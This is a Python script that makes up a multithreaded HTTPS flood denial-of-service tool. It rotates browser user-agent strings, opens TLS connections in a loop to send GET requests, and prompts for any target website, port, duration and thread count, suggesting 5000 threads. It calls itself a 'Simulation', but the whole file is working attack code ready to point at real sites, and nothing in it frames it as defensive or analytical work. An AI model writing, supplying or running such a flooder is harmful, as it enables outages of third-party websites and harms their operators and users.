import ssl
import socket
import threading
import random
import time
import sys
import socket

# Random User-Agent Generator with More Options
def random_user_agent():
    user_agents = [
        # Windows User-Agents
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        
        # MacOS User-Agents
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:68.0) Gecko/20100101 Firefox/68.0",
        
        # Linux User-Agents
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux i686) Gecko/20100101 Firefox/91.0",
        
        # Mobile User-Agents
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
        
        # iPad User-Agents
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
        
        # Android User-Agents
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QD1A.190505.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        
        # Edge User-Agent
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
        
        # Opera User-Agent
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0 Opera/30.0"
    ]
    return random.choice(user_agents)

# HTTPS Flood Attack
def https_flood(target_host, target_port, duration):
    context = ssl.create_default_context()
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            # Create a socket connection
            sock = socket.create_connection((target_host, target_port))
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)

            # Randomized HTTPS GET Request
            http_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {random_user_agent()}\r\n"
                "Connection: keep-alive\r\n\r\n"
            )
            ssl_sock.sendall(http_request.encode('utf-8'))
            print(f"HTTPS Flood: Sent request to {target_host}:{target_port}")
            ssl_sock.close()
        except Exception as e:
            print(f"Error: {e}")

# Main Function
def main():
    print("=== Advanced HTTPS Flood DDoS Simulation ===")
    
    # Get Website URL and Port from User
    target_url = input("Enter the target website URL (e.g., www.example.com): ")
    target_port = int(input("Enter target port (default is 443 for HTTPS): ") or 443)  # Default port is 443 for HTTPS
    
    # Resolve Target IP from URL
    try:
        target_host = socket.gethostbyname(target_url)
        print(f"Resolved IP Address: {target_host}")
    except socket.gaierror:
        print("Error: Unable to resolve target URL. Exiting.")
        sys.exit()

    # Get attack duration and number of threads from user
    duration = int(input("Enter attack duration (in seconds): "))
    threads = int(input("Enter number of threads to launch (e.g., 5000): "))
    print(f"Launching {threads} threads to flood {target_host}:{target_port} for {duration} seconds.")

    # Launch HTTPS Flood
    for _ in range(threads):
        thread = threading.Thread(target=https_flood, args=(target_host, target_port, duration))
        thread.daemon = True
        thread.start()

    time.sleep(duration)
    print("Attack finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")
